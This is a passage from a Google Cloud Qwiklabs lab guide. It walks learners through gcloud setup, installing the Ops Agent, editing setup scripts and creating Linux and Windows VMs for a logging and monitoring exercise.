&lt;myaccount&gt;@&lt;mydomain&gt;.com (active)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;/mydomain&gt;&lt;/myaccount&gt;</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><strong><span>Example output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Credentialed accounts:</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> - google1623327_student@qwiklabs.net</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><ul><li><p><span>You can list the project ID with this command:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud config list project</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[core]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">project = &lt;project_id&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;/project_id&gt;</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><strong><span>Example output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[core]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">project = qwiklabs-gcp-44776a13dea667a6</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><strong><span>Note:</span></strong><span> Full documentation of </span><strong><span>gcloud</span></strong><span> is available in the </span><a href='https://cloud.google.com/sdk/gcloud'><span>gcloud CLI overview guide </span></a><span>.</span></p><h4 id='task-1-set-up-resources-in-your-first-project'><span>Task 1. Set up resources in your first project</span></h4><p><span>In this task, you create the Google Cloud resources for the first project.</span></p><p><span>In the Qwiklabs Connection Details section, you will see </span><em><span>two</span></em><span> projects listed. The first project will contain active Google Cloud resources, which will generate logs and monitoring metric data.</span></p><p><span>The second project will contain your Monitoring account configuration data.</span></p><p><strong><span>Note:</span></strong><span> Make sure that you are working on project 1 for this task!</span></p><ol start='' ><li><p><span>If you have not activated cloud shell yet then, activate the Cloud Shell by clicking on </span><strong><span>Activate cloud shell</span></strong><span>. If prompted, click </span><strong><span>Continue</span></strong><span>.</span></p></li><li><p><span>In the Cloud Shell, download and unpack an archive that contains setup code:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl https://storage.googleapis.com/cloud-training/gcpsec/labs/stackdriver-lab.tgz | tar -zxf -</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">cd stackdriver-lab</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Click on the </span><strong><span>Open Editor</span></strong><span> icon in the top-right corner of your Cloud Shell session.</span></p></li><li><p><span>Click </span><strong><span>Open in a new window</span></strong><span> if prompted.</span></p></li><li><p><span>Open the </span><strong><span>stackdriver-lab</span></strong><span> folder and select the </span><strong><span>linux_startup.sh</span></strong><span> file.</span></p></li><li><p><span>Replace the </span><code># install Ops Agent</code><span> section with the following:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"># install Ops Agent</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl -sSO https://dl.google.com/cloudagents/add-google-cloud-ops-agent-repo.sh</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">sudo bash add-google-cloud-ops-agent-repo.sh --also-install</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>After pasting, make sure that your lines of code are properly indented.</span></p></li><li><p><span>Save your file.</span></p></li><li><p><span>Now open the </span><code>setup.sh</code><span> file.</span></p></li><li><p><span>Update the image version in </span><code># create vms</code><span> section for windows-server (row 17) after </span><code>--image</code><span> with the following:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">windows-server-2016-dc-core-v20240214</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Add the following flag at the end of line 16 to set the machine type for the Linux VM:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--machine-type=e2-micro</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Add the following flag at the end of line 17 to set the machine type for the Windows VM:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--machine-type=e2-standard-2</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>After pasting, make sure that your lines of code are properly indented.</span></p></li><li><p><span>Save your file.</span></p></li><li><p><span>In the Cloud Console, click </span><strong><span>Open Terminal</span></strong><span> in the top-right corner.</span></p></li></ol><p><span>The created resources will include:</span></p><ul><li><p><span>Service accounts (for use by VMs).</span></p></li><li><p><span>Role assignments (granting service accounts permissions to write to Monitoring).</span></p></li><li><p><span>A Linux VM with Apache and the Ops Agent installed.</span></p></li><li><p><span>A Windows VM with Ops Agent installed.</span></p></li><li><p><span>A Google Kubernetes Engine cluster with an Nginx deployment.</span></p></li><li><p><span>A Pub/Sub Topic and Subscription.</span></p></li></ul><ol start='' ><li><p><span>Run the following command to replace the zones in the setup script with a new one:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">sed -i 's/us-west1-b/us-west1-a/g' setup.sh</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">sed -i 's/us-west1-b/us-west1-a/g' gke.sh</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Now run the following command. If prompted, click </span><strong><span>Authorize</span></strong><span>.</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">./setup.sh</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You can safely ignore errors about service accounts and firewalls already existing.</span></p><p><span>Ensure you receive a similar output that states that both the Linux and Windows VMs are created:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Created [https://www.googleapis.com/compute/v1/projects/qwiklabs-gcp-00-029875ba6255/zones/us-west1-a/instances/linux-server-qwiklabs-gcp-00-029875ba6255].</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NAME: linux-server-qwiklabs-gcp-00-029875ba6255</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ZONE: us-west1-a</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">MACHINE_TYPE: e2-micro</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">PREEMPTIBLE:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">INTERNAL_IP: 10.138.0.2</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">EXTERNAL_IP: 34.83.92.58</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">STATUS: RUNNING</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Created [https://www.googleapis.com/compute/v1/projects/qwiklabs-gcp-00-029875ba6255/zones/us-west1-a/instances/windows-server-qwiklabs-gcp-00-029875ba6255].</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">......</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">......</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NAME: windows-server-qwiklabs-gcp-00-029875ba6255</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ZONE: us-west1-a</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">MACHINE_TYPE: e2-standard-2</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">PREEMPTIBLE:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">INTERNAL_IP: 10.138.0.3</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">EXTERNAL_IP: 35.247.97.91</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">STATUS: RUNNING</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Updated [https://www.googleapis.com/compute/v1/projects/qwiklabs-gcp-00-029875ba6255/zones/us-west1-a/instances/linux-server-qwiklabs-gcp-00-029875ba6255].</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 495px;"></div><div class="CodeMirror-gutters" style="display: none; height: 495px;"></div></div></div></pre><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Set up resources in the first project</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h4 id='task-2-view-and-filter-logs-in-first-project'><span>Task 2. View and filter logs in first project</span></h4><p><span>In this task, you view VM instance logs with simple 